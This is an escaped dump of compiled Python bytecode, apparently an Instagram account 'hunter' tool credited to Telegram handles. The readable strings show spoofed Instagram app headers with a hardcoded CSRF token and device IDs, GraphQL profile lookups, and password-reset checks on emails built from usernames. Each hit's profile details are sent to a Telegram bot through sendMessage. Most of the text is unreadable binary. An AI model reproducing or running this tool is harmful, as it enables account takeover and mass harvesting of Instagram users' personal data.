r\r\000\000\000\332\005checkr\363\000\000\000\331\001\000\000s]\001\000\000\200\000\345\t\034\321\t\036\324\t\036\200B\330\n\024\200C\330\020\023\225g\224k\245#\245d\244j\241l\244l\321\"3\324\"3\327\":\322\":\321\"<\324\"<\321\026=\324\026=\327\026G\322\026G\321\026I\324\026I\310#\3102\310#\324\026N\321\020N\200I\335\n\r\215d\214j\211l\214l\321\n\033\324\n\033\200C\340\026\030\330\022`\330\030J\360\007\004\017\006\360\000\004\017\006\200G\360\014\000\030[\001\325]a\324]g\330\032<\330\024\027\330\024\027\330\031\"\330\025\032\360\013\006i\001\n\360\000\006i\001\n\361\000\006^\001\013\364\000\006^""\001\013\361\000\006\030\013\360\016\000\037\"\360\021\t\014\006\360\000\t\014\006\200D\365\024\000\020\030\214}\320\035`\320jq\320x|\320\017}\321\017}\324\017}\364\000\000\020C\002\200H\330\007\014\220\010\320\007\030\320\007\030\330\013\027\2305\320\013 \320\013 \335\014\027\230\005\321\014\036\324\014\036\320\014\036\320\014\036\330\r\027\2305\320\r \320\r \240J\260%\320$7\320$7\335\014\025\220e\321\014\034\324\014\034\320\014\034\335\010\016\220!\211\013\210\006\335\010\014\211\006\214\006\210\006\210\006\210\006\345\010\020\220A\211\r\210\010\335\010\014\211\006\214\006\210\006\210\006\210\006r\017\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\005\000\000\000\003\000\000\000\363\010\001\000\000\227\000\t\000i\000d\001d\002\223\001d\003d\004\223\001d\005d\006\223\001d\007d\010\223\001d\td\n\223\001d\013d\n\223\001d\014d\r\223\001d\016d\017\223\001d\020d\021\223\001d\022d\023\223\001d\024d\025\223\001d\026d\027\223\001d\030d\031\223\001d\032d\033\223\001d\034d\035\223\001d\036d\037\223\001d d!\223\001d\"d#d$\234\002\245\001}\001d%|\000z\000\000\000d&z\000\000\000d'd(\234\002}\002t\001\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000d)|\001|\002\254*\246\003\000\000\253\003\000\000\000\000\000\000\000\000\240\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000}\003|\003d+\031\000\000\000\000\000\000\000\000\000}\004n\t#\000\001\000d,}\004Y\000n\003x\003Y\000w\001|\004S\000)-Nz\023X-Pigeon-Session-Idz$50cc6861-7036-43b4-802e-fb4282799c60z\026X-Pigeon-Rawclienttimez\0161700251574.982z\025X-IG-Connection-Speedz\006-1kbpsz\031X-IG-Bandwidth-Speed-KBPSz\006-1.000z\033X-IG-Bandwidth-TotalBytes-Br^\000\000\000z\033X-IG-Bandwidth-TotalTime-MSz\022X-Bloks-Version-Id\332@c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0z\024X-IG-Connection-Type\332\004WIFIz\021X-IG-Capabilitiesz\0103brTvw==z\013X-IG-App-ID\332\017567067343352427r""\333\000\000\000ztInstagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)z\017Accept-Languagez\014en-GB, en-USr\334\000\000\000r\332\000\000\000r\335\000\000\000r\313\000\000\000z\017Accept-Encodingz\rgzip, deflate\332\004Hostz\017i.instagram.comz\020X-FB-HTTP-Engine\332\005Ligerz\nkeep-alive\332\003356)\002\332\nConnectionz\016Content-Lengthz\3760d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{\"_csrftoken\":\"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj\",\"adid\":\"0dfaf820-2748-4634-9365-c3d8c8011256\",\"guid\":\"1f784431-2663-4db9-b624-86bd9ce1d084\",\"device_id\":\"android-b93ddb37e983481c\",\"query\":\"z\002\"}rR\000\000\000r\344\000\000\000r\347\000\000\000r\350\000\000\000r\306\000\000\000u&\000\000\000C\312\234\341\264\207\341\264\204\341\264\213 R\341\264\207s\341\264\207\341\264\233 F\312\200\341\264\217\341\264\215 I\311\242)\003r2\000\000\000r\025\000\000\000r3\000\000\000)\005\332\004userr|\000\000\000r\210\000\000\000r\240\000\000\000r\020\000\000\000s\005\000\000\000     r\r\000\000\000\332\004restr\375\000\000\000\374\001\000\000s}\001\000\000\200\000\360\002\035\003/\360\002\024\017\002\330\004\031\320\033A\360\003\024\017\002\340\004\034\320\036.\360\005\024\017\002\360\006\000\005\034\230X\360\007\024\017\002\360\010\000\005 \240\030\360\t\024\017\002\360\n\000\005\"\2403\360\013\024\017\002\360\014\000\005\"\2403\360\r\024\017\002\360\016\000\005\031\320\032\\\360\017\024\017\002\360\020\000\005\033\230F\360\021\024\017\002\360\022\000\005\030\230\032\360\023\024\017\002\360\024\000\005\022\320\023$\360\025\024\017\002\360\026\000\005\021\360\000\000\023I\002\360\027\024\017\002\360\030\000\005\026\220~\360\031\024\017\002\360\032\000\006\016\320\017]\360\033\024\017\002\360\034\000\005\023\320\024F\360\035\024\017\002\360\036\000\005\026\220\360\037\024\017\002\360 \000\005\013\320\014\035\360!\024\017\002\360\"\000\005\027\230\007\360#\024\017\002\360$\000\023\037\330\026\033""\360'\024\017\002\360\000\024\017\002\360\000\024\017\002\200G\360,\000\024T\004\360\000\000U\004Y\004\361\000\000\024Y\004\360\000\000Z\004^\004\361\000\000\024^\004\330\032\035\360\005\003\014\004\360\000\003\014\004\200D\365\010\000\020\030\214}\320\035`\320ip\320vz\320\017|\321\017|\324\017|\367\000\000\020B\002\362\000\000\020B\002\361\000\000\020D\002\364\000\000\020D\002\200H\330\006\016\210w\324\006\027\200A\200A\370\360\002\001\003/\330\006.\200A\200A\200A\370\370\370\330\t\n\200(s\014\000\000\000\202A6A9\000\3019\004A?\003c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\000\003\000\000\000\363V\000\000\000\227\000\t\000g\000d\001\242\001}\001|\001D\000]\017\\\002\000\000}\002}\003|\000|\002k\001\000\000\000\000r\004|\003c\002\001\000S\000\214\020d\002S\000#\000t\000\000\000\000\000\000\000\000\000\000\000$\000r\004\001\000Y\000d\000S\000w\000x\003Y\000w\001)\003N)\016)\002i\030\204\023\000i\332\007\000\000)\002i\360\327\016\001i\333\007\000\000)\002i\200\314\254\020i\334\007\000\000)\002i0\004\2645i\335\007\000\000)\002rS\000\000\000i\336\007\000\000)\002rU\000\000\000i\337\007\000\000)\002rW\000\000\000i\340\007\000\000)\002rY\000\000\000i\341\007\000\000)\002r[\000\000\000i\342\007\000\000)\002r]\000\000\000i\343\007\000\000)\002l\003\000\000\000\003C^=(\000i\344\007\000\000)\002l\003\000\000\000\357H\363j.\000i\345\007\000\000)\002l\003\000\000\000\nXSB5\000i\346\007\000\000)\002l\003\000\000\000\3729\214{:\000\351\347\007\000\000r\377\000\000\000)\001r\230\000\000\000)\004\332\002hy\332\006ranges\332\005upper\332\004years\004\000\000\000    r\r\000\000\000\332\004dater\004\001\000\000\035\002\000\000sk\000\000\000\200\000\360\002\031\005\r\360\002\020\022\n\360\000\020\022\n\360\000\020\022\n\210\006\360$\000\034\"\360\000\002\t\034\360\000\002\t\034\211K\210E\2204\330\017\021\220U\212{\210{\330\027\033\220\013\220\013\220\013\360\003\000\020\033\340\017\023\210t\370\345\013\024\360\000\001\005\r\360\000\001\005\r\360\000\001\005\r\330""\010\014\210\004\210\004\360\003\001\005\r\370\370\370s\020\000\000\000\202\024\032\000\227\001\032\000\232\n(\003\247\001(\003c\002\000\000\000\000\000\000\000\000\000\000\000\022\000\000\000\003\000\000\000\363l\003\000\000\227\000t\000\000\000\000\000\000\000\000\000\000\000\240\001\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000i\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\002\002\000|\002j\001\000\000\000\000\000\000\000\000d\001d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\003\002\000|\002j\001\000\000\000\000\000\000\000\000d\002d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\004\002\000|\002j\001\000\000\000\000\000\000\000\000d\003d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\005\002\000|\002j\001\000\000\000\000\000\000\000\000d\004d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\006\002\000|\002j\001\000\000\000\000\000\000\000\000d\005d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\007\002\000|\002j\001\000\000\000\000\000\000\000\000d\006d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\010\002\000|\002j\001\000\000\000\000\000\000\000\000d\007d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\t\002\000|\002j\001\000\000\000\000\000\000\000\000d\010d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\n\002\000|\002j\001\000\000\000\000\000\000\000\000d\td\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\013\t\000|\005r.|\007r,t\005\000\000\000\000\000\000\000\000\000\000|\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\nk\005\000\000\000\000r\026t\005\000\000\000\000\000\000\000\000\000\000|\007\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\013k\005\000\000\000\000r\003d\014}\014n\005d\r}\014n\002d\r}\014n\t#\000\001\000d\r}\014Y\000n\003x\003Y\000w\001t\006\000\000\000\000\000\000\000\000\000\000d\016z\r\000\000a\003d\017t\006\000\000\000\000\000\000""\000\000\000\000\233\000d\020|\014\233\000d\021|\005\233\000d\022|\007\233\000d\023|\000\233\000d\024|\000\233\000|\001\233\000d\025t\t\000\000\000\000\000\000\000\000\000\000|\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\233\000d\026|\000\233\000d\027\235\022}\rt\013\000\000\000\000\000\000\000\000\000\000d\030d\031\246\002\000\000\253\002\000\000\000\000\000\000\000\0005\000}\016|\016\240\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\233\000d\032\235\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\000d\000d\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000n\013#\0001\000s\004w\002x\003Y\000w\001\001\000Y\000\001\000\001\000\t\000t\017\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000d\033t\020\000\000\000\000\000\000\000\000\000\000\233\000d\034t\022\000\000\000\000\000\000\000\000\000\000\233\000d\035|\r\233\000d\036\235\007\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\000S\000#\000\001\000Y\000d\000S\000x\003Y\000w\001#\000t\024\000\000\000\000\000\000\000\000\000\000$\000r\013}\017Y\000d\000}\017~\017d\000S\000d\000}\017~\017w\001w\000x\003Y\000w\001)\037N\332\002pk\332\tfull_name\332\016follower_count\332\017following_count\332\013media_count\332\nis_private\332\tbiography\332\013is_verified\332\013is_business\351\n\000\000\000r}\000\000\000TFr\021\000\000\000uq\000\000\000\360\235\227\246\360\235\227\224\360\235\227\247\360\235\227\224\360\235\227\241 \360\235\227\246\360\235\227\230\360\235\227\241\360\235\227\227 \360\235\227\224 \360\235\227\233\360\235\227\234\360\235\227\247 \360\223\203\265\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230 \360\235\227\233\360\235\227\234\360\235\227\247 - u\025\000\000\000\n\360\235\227\240\360\235\227\230\360\235\227\247\360\235\227\224  - u(\000\000\000\n\360\235\227\231\360\235""\227\242\360\235\227\237\360\235\227\237\360\235\227\242\360\235\227\252\360\235\227\230\360\235\227\245\360\235\227\246 - u\030\000\000\000\n\360\235\227\243\360\235\227\242\360\235\227\246\360\235\227\247\360\235\227\246 - u*\000\000\000\n\360\235\227\250\360\235\227\246\360\235\227\230\360\235\227\245\360\235\227\241\360\235\227\224\360\235\227\240\360\235\227\230 - <code>u\037\000\000\000</code>\n\360\235\227\230\360\235\227\240\360\235\227\224\360\235\227\234\360\235\227\237 - u\030\000\000\000\n\360\235\227\245\360\235\227\230\360\235\227\246\360\235\227\230\360\235\227\247 - u@\000\000\000\n\360\235\227\250\360\235\227\246\360\235\227\230\360\235\227\245 \360\235\227\250\360\235\227\245\360\235\227\237 : <a href=\"https://instagram.com/u\200\000\000\000\">\360\235\227\226\360\235\227\237\360\235\227\234\360\235\227\226\360\235\227\236 \360\235\227\233\360\235\227\230\360\235\227\245\360\235\227\230</a>\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\n\360\235\227\225\360\235\227\254 : @MordisX \360\235\227\226\360\235\227\233 : @xPythonToolsz\020xPythonTools.txtr\257\000\000\000r\005\000\000\000r+\000\000\000z\025/sendMessage?chat_id=z\006&text=z\020&parse_mode=HTML)\013\332\tinfoinstar\031\000\000\000\332\003int\332\005totalr\375\000\000\000r\227\000\000\000r\010\000\000\000r2\000\000\000\332\005token\332\002IDr\230\000\000\000)\020r/\000\000\000r\310\000\000\000r\216\000\000\000\332\002Idr\007\001\000\000\332\004fows\332\004fowgr\304\000\000\000\332\010isPraise\332\003bior\r\001\000\000\332\004bizz\332\004meta\332\002ss\332\002ffr\243\000\000\000s\020\000\000\000                r\r\000\000\000r\305\000\000\000r\305\000\000\000:\002\000\000s\247\002\000\000\200\000\365\006\000\t\022\217\r\212\r\220h\230r\321\010\"\324\010\"\200B\340\t\017\210\022\214\026\220\004\220d\321\t\033\324\t\033\200B\330\020\026\220\002\224\006\220{\240D\321\020)\324\020)""\200I\330\013\021\2102\2146\320\022\"\240D\321\013)\324\013)\200D\330\013\021\2102\2146\320\022#\240T\321\013*\324\013*\200D\330\t\017\210\022\214\026\220\r\230t\321\t$\324\t$\200B\330\017\025\210r\214v\220l\240D\321\017)\324\017)\200H\330\n\020\210\"\214&\220\033\230d\321\n#\324\n#\200C\330\022\030\220\"\224&\230\035\250\004\321\022-\324\022-\200K\330\013\021\2102\2146\220-\240\024\321\013&\324\013&\200D\360\002\t\005\023\330\014\020\360\000\006\t\031\220R\360\000\006\t\031\335\020\023\220D\221\t\224\t\230R\222\017\220\017\245C\250\002\241G\244G\250q\242L\240L\330\027\033\220\004\220\004\340\027\034\220\004\220\004\340\023\030\210D\370\370\360\002\001\005\023\330\r\022\210\004\210\004\210\004\370\370\370\365\006\000\005\n\210Q\201J\200E\360\002\n\n0\3355:\360\003\n\n0\360\000\n\n0\340\025\031\360\005\n\n0\360\000\n\n0\360\006\000)-\360\007\n\n0\360\000\n\n0\360\010\000\031\033\360\t\n\n0\360\000\n\n0\360\n\000+3\360\013\n\n0\360\000\n\n0\360\014\000\031!\360\r\n\n0\360\014\000#%\360\r\n\n0\360\000\n\n0\365\016\000\031\035\230X\231\016\234\016\360\017\n\n0\360\000\n\n0\360\020\000A\001I\001\360\021\n\n0\360\000\n\n0\360\000\n\n0\200B\365\030\000\n\016\320\016 \240#\321\t&\324\t&\360\000\001\005\"\250\"\330\010\n\217\010\212\010\220H\220\037\220\037\220\037\321\010!\324\010!\320\010!\360\003\001\005\"\360\000\001\005\"\360\000\001\005\"\361\000\001\005\"\364\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\370\370\370\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\000\001\005\"\360\006\004\005\r\335\017\027\214|\320\034u\2755\320\034u\320\034u\325WY\320\034u\320\034u\320ac\320\034u\320\034u\320\034u\321\017v\324\017v\320\017v\320\017v\320\017v\370\330\t\024\220\004\220\004\220\004\370\370\370\370\335\013\024\360\000\001\005\r\360\000\001\005\r\360\000\001\005\r\330\010\014\210\004\210\004\210\004\210\004\210\004\370\370\370\370\360\003\001\005\r\370\370\370sB\000\000\000\30262C)\000""\303)\004C/\003\304;\031E \003\305 \004E$\007\305'\001E$\007\305,(F\026\000\306\026\002F\033\003\306\030\001F\036\000\306\033\003F\036\000\306\036\nF3\003\306.\005F3\003c\000\000\000\000\000\000\000\000\000\000\000\000\t\000\000\000\003\000\000\000\363\300\002\000\000\227\000\t\000d\002\240\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000t\006\000\000\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000t\006\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000z\000\000\000d\003\254\004\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000t\r\000\000\000\000\000\000\000\000\000\000j\007\000\000\000\000\000\000\000\000t\021\000\000\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000\000\000j\t\000\000\000\000\000\000\000\000t\024\000\000\000\000\000\000\000\000\000\000t\026\000\000\000\000\000\000\000\000\000\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\005d\006\234\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\007d\010\234\003}\000t\031\000\000\000\000\000\000\000\000\000\000j\r\000\000\000\000\000\000\000\000d\td\n|\000d\013\031\000\000\000\000\000\000\000\000\000i\001|\000\254\014\246\003\000\000\253\003\000\000\000\000\000\000\000\000}\001\t\000|\001\240\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\240\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\ri\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\240\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016i\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\240\016\000\000\000\000\000\000\000\000\000\000\000\000\000""\000\000\000\000\000\000\000d\017\246\001\000\000\253\001\000\000\000\000\000\000\000\000}\002|\001\240\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\240\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\ri\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000\240\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\016i\000\246\002\000\000\253\002\000\000\000\000\000\000\000\000t\036\000\000\000\000\000\000\000\000\000\000|\002<\000\000\000|\002d\020z\000\000\000|\002d\021z\000\000\000g\002}\003|\003D\000]\021}\004t!\000\000\000\000\000\000\000\000\000\000|\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\214\022n\007#\000\001\000Y\000n\003x\003Y\000w\001\220\001\214^)\022NTrb\000\000\000\351 \000\000\000)\001\332\001k\332\007PROFILE)\002\332\002id\332\016render_surface\332\02125618261841150840)\003\332\003lsd\332\tvariables\332\006doc_idz%https://www.instagram.com/api/graphqlz\010X-FB-LSDr%\001\000\000r\350\000\000\000r\210\000\000\000r\374\000\000\000r/\000\000\000r\301\000\000\000r\321\000\000\000)\021r\214\000\000\000\332\006random\332\007choices\332\006string\332\rascii_letters\332\006digitsr3\000\000\000r\357\000\000\000r\021\001\000\000r\030\000\000\000\332\003bbkr\"\001\000\000r2\000\000\000r\025\000\000\000r\031\000\000\000r\020\001\000\000r\363\000\000\000)\005r\210\000\000\000r\240\000\000\000r/\000\000\000\332\006emailsr\306\000\000\000s\005\000\000\000     r\r\000\000\000r\310\000\000\000r\310\000\000\000j\002\000\000sK\001\000\000\200\000\360\002\022\005\022\340\023\025\2277\2227\2356\234>\255&\324*>\305\026\304\035\321*N\320RT\320\033U\321\033U\324\033U\321\023V\324\023V\335\031\035\234\032\2553\255v\324/?\305\003\305R\321/H\324/H\321+I\324+I\320]f\320$g\320$g\321\031h\324\031h\330\026)\360\007\004\020\n\360\000\004\020\n\210\004\365\014\000\024\034\224=\330\0143\330""\025\037\240\024\240e\244\033\320\024-\330\021\025\360\007\004\024\n\361\000\004\024\n\364\000\004\024\n\210\010\360\n\006\t\022\330\027\037\227}\222}\221\224\327\027*\322\027*\2506\2602\321\0276\324\0276\327\027:\322\027:\2706\3002\321\027F\324\027F\327\027J\322\027J\310:\321\027V\324\027V\210H\330\"*\247-\242-\241/\244/\327\"5\322\"5\260f\270b\321\"A\324\"A\327\"E\322\"E\300f\310b\321\"Q\324\"Q\215I\220h\321\014\037\330\027\037\240,\321\027.\260\010\270:\3210E\320\025F\210F\330\031\037\360\000\001\r\035\360\000\001\r\035\220\005\335\020\025\220e\221\014\224\014\220\014\220\014\360\003\001\r\035\370\340\010\021\210r\210r\370\370\370\361%\022\005\022s\r\000\000\000\302%B1E\027\000\305\027\002E\033\003\351\310\000\000\000)\001\332\006target)r(\001\000\000r\006\000\000\000r&\000\000\000rF\000\000\000\332\010coloramar\002\000\000\000r\003\000\000\000r\016\000\000\000\332\003RED\332\004BLUE\332\005GREEN\332\006YELLOW\332\004CYAN\332\007MAGENTA\332\006colors\332\ncolor_file\332\004path\332\006existsr\227\000\000\000r\242\000\000\000r\021\001\000\000r\302\000\000\000r\322\000\000\000\332\nlast_index\332\nValueError\332\003len\332\013color_index\332\rcurrent_colorr\010\000\000\000r\217\000\000\000\332\003artr$\000\000\000r2\000\000\000r3\000\000\000r*\001\000\000\332\tthreadingr\023\000\000\000\332\nwebbrowser\332\nuser_agentr\025\000\000\000r\304\000\000\000r\026\000\000\000r\220\000\000\000r\027\000\000\000rf\000\000\000r\030\000\000\000r\216\000\000\000r\221\000\000\000r\351\000\000\000r\353\000\000\000r\031\000\000\000\332\nrich.tabler\032\000\000\000\332\014rich.consoler\033\000\000\000\332\003sol\332\002mer\034\000\000\000\332\002gp\332\003bs4r\035\000\000\000\332\003sop\332\006parser\332\014rich.columnsr\036\000\000\000\332\001L\332\001C\332\001B\332\001Y\332\001X\332\001G\332\001R\332\001O\332\001Fr4\000\000\000r1\000\000\000r>\000\000\000r%\000\000\000\332\004cyan\332\007magenta\332\001M\332\005whiterI\000\000\000\332\005resetr\022\001\000\000\332\003hit\332""\004b_ig\332\002ber\310\000\000\000r)\000\000\000r;\000\000\000rC\000\000\000\332\005inputr\023\001\000\000r\024\001\000\000rG\000\000\000\332\003acarH\000\000\000rJ\000\000\000rK\000\000\000rL\000\000\000r\020\001\000\000rN\000\000\000r\257\000\000\000r\225\000\000\000r\325\000\000\000\332\010YourKingr-\001\000\000r\"\001\000\000\332\004exit\332\007Session\332\007session\332\002aar\207\000\000\000\332\004csrfrg\000\000\000r\231\000\000\000r\263\000\000\000r\311\000\000\000r\327\000\000\000r\363\000\000\000r\375\000\000\000r\004\001\000\000r\305\000\000\000r\215\000\000\000\332\001_\332\005start\251\000r\017\000\000\000r\r\000\000\000\372\010<module>rj\001\000\000\001\000\000\000s~\010\000\000\360\003\001\001\001\330\000\r\200\r\200\r\200\r\330\000\n\200\n\200\n\200\n\330\000\013\200\013\200\013\200\013\330\000\t\200\t\200\t\200\t\330\000\031\320\000\031\320\000\031\320\000\031\320\000\031\320\000\031\330\000\026\320\000\026\320\000\026\320\000\026\320\000\026\320\000\026\360\004\004\001\034\360\000\004\001\034\360\000\004\001\034\360\016\000\013\017\214(\220D\224I\230t\234z\2504\254;\270\004\274\t\3004\304<\320\tP\200\006\360\006\000\016\037\200\n\360\006\000\004\006\2047\207>\202>\220*\321\003\035\324\003\035\360\000\007\001\023\330\t\r\210\024\210j\230#\321\t\036\324\t\036\360\000\004\005\033\240!\360\002\003\t\033\330\031\034\230\023\230Q\237V\232V\231X\234X\237^\232^\321\035-\324\035-\321\031.\324\031.\210J\210J\370\330\017\031\360\000\001\t\033\360\000\001\t\033\360\000\001\t\033\330\031\032\210J\210J\210J\360\003\001\t\033\370\370\370\360\007\004\005\033\360\000\004\005\033\360\000\004\005\033\361\000\004\005\033\364\000\004\005\033\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\370\370\370\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\360\000\004\005\033\370\360\014\000\022\023\200J\360\006\000\020\032\230A\211~\240\023\240\023\240V\241\033\244\033\321\016,\200\013\330""\020\026\220{\324\020#\200\r\360\006\000\006\n\200T\210*\220c\321\005\032\324\005\032\360\000\001\001\036\230a\330\004\005\207G\202G\210C\210C\220\013\321\014\034\324\014\034\321\004\035\324\004\035\320\004\035\360\003\001\001\036\360\000\001\001\036\360\000\001\001\036\361\000\001\001\036\364\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\370\370\370\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\000\001\001\036\360\010\033\007Z\002\200\003\360<\000\001\006\200\005\200c\210=\321\000\031\324\000\031\320\000\031\340\000\005\200\005\200m\360\000\002\027i\002\361\000\002\007i\002\361\000\002\001j\002\364\000\002\001j\002\360\000\002\001j\002\360 \000\001\020\200\017\200\017\200\017\330\000\r\200\r\200\r\200\r\330\000\023\320\000\023\320\000\023\320\000\023\320\000\023\320\000\023\320\000\023\320\000\023\330\000\034\320\000\034\320\000\034\320\000\034\320\000\034\320\000\034\330\000\025\320\000\025\320\000\025\320\000\025\320\000\025\320\000\025\320\000\025\320\000\025\330\000\030\320\000\030\320\000\030\320\000\030\330\000\037\320\000\037\320\000\037\320\000\037\320\000\037\320\000\037\330\0001\320\0001\320\0001\320\0001\320\0001\320\0001\330\000\037\320\000\037\320\000\037\320\000\037\320\000\037\320\000\037\330\000\"\320\000\"\320\000\"\320\000\"\320\000\"\320\000\"\330\000\t\200\t\200\t\200\t\330\000\016\200\016\200\016\200\016\330\000\013\200\013\200\013\200\013\330\000\030\320\000\030\320\000\030\320\000\030\320\000\030\320\000\030\330\000\n\200\n\200\n\200\n\330\000*\320\000*\320\000*\320\000*\320\000*\320\000*\320+G\320+G\320+G\320+G\320+G\320+G\330\000'\320\000'\320\000'\320\000'\320\000'\320\000'\330\000\"\320\000\"\320\000\"\320\000\"\320\000\"\320\000\"\330\000$\320\000$\320\000$\320\000$\320\000$\320\000$\330\000'\320\000'\320\000'\320\000'\320\000'\320\000'\330\000$\320\000$\320\000$\320\000$\320\000$\320\000$\330\000'\320\000'\320\000'\320\000'\320""\000'\320\000'\330\000 \320\000 \320\000 \320\000 \320\000 \320\000 \330\000 \320\000 \320\000 \320\000 \320\000 \320\000 \330\004\020\200\001\330\004\020\200\001\330\004\020\200\001\330\004\020\200\001\330\004\020\200\001\330\004\n\200\001\330\004\020\200\001\330\004\020\200\001\330\004\024\200\001\330\004\020\200\001\340\006\027\200\003\330\010\031\200\005\330\t\032\200\006\330\007\030\200\004\330\007\030\200\004\330\n\033\200\007\330\004\025\200\001\330\010\031\200\005\330\t \200\006\330\010\021\200\005\340\010\t\200\005\330\006\007\200\003\330\007\010\200\004\330\005\006\200\002\330\005\006\200\002\330\000\017\200\017\200\017\200\017\330\000\013\200\013\200\013\200\013\360\004\005\001\036\360\000\005\001\036\360\000\005\001\036\360\016\017\001\025\360\000\017\001\025\360\000\017\001\025\360\"\016\001D\001\360\000\016\001D\001\360\000\016\001D\001\360\"\000\t\016\210\005\2203\320\016G\320\016G\320\016G\321\010H\324\010H\200\005\330\003\017\200<\220\005\321\003\026\324\003\026\360\000\003\001\022\330\t\016\210\025\320\017E\220d\320\017E\320\017E\320\017E\321\tF\324\tF\200B\330\004\021\200M\220%\230\022\321\004\034\324\004\034\320\004\034\330\004\016\200D\204J\210q\201M\204M\200M\330\000\t\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\330\006\007\200\003\330\010\t\200\005\330\007\010\200\004\330\013\014\200\010\330\013\014\200\010\330\t\n\200\006\330\014\016\200\t\360\004\007\001\027\360\000\007\001\027\360\000\007\001\027\360\022\000\001\014\200\013\200\013\200\013\340\007\021\200\004\360\004\007\005o\001\360\006\000\002\006\360\007\007\005o\001\360\000\007\005o\001\360\006\000:=\360\007\007\005o\001\360\000\007\005o\001\360\010\000\002\006\360\t\007\005o\001\360\000\007\005o\001\360\010\000:=\360\t\007\005o\001\360\000\007\005o\001\360\n\000\002\006\360\013\007\005o\001\360\000\007\005o\001\360\n\000:=\360\013\007\005o\001\360\000\007\005o\001\360\014\000\002\006\360\r\007\005o\001\360\000\007\005o\001\360\014\000:=\360\r\007\005o\001\360\000\007\005o""\001\360\016\000\002\006\360\017\007\005o\001\360\000\007\005o\001\360\016\000:=\360\017\007\005o\001\360\000\007\005o\001\360\000\007\005o\001\200\001\360\022\000\r\016\217G\212G\220D\211M\214M\360\000\002\001\024\360\000\002\001\024\200D\330\004\t\200E\210$\201K\204K\200K\330\004\016\200D\204J\210s\201O\204O\200O\200O\330\013\020\2105\220C\320\021_\320\021_\320X]\320\021_\320\021_\321\013`\324\013`\200\010\340\003\013\210s\202?\200?\330\n\017\200C\330\t\021\200B\200B\330\005\r\220\023\202_\200_\330\n\022\200C\330\t\022\200B\200B\330\005\r\220\023\202_\200_\330\n\023\200C\330\t\022\200B\200B\330\005\r\220\023\202_\200_\330\n\023\200C\330\t\023\200B\200B\330\005\r\220\023\202_\200_\330\n\024\200C\330\t\023\200B\200B\330\005\r\220\023\202_\200_\330\n\024\200C\330\t\023\200B\200B\330\005\r\220\023\202_\200_\330\n\024\200C\330\t\023\200B\200B\330\005\r\220\023\202_\200_\330\n\024\200C\330\t\023\200B\200B\330\005\r\220\023\202_\200_\330\n\024\200C\330\t\024\200B\200B\330\005\r\220\023\202_\200_\330\n\017\200C\330\t\024\200B\200B\340\004\010\200D\201F\204F\200F\360\006\010\001\r\360\002\007\005\r\330\0146\210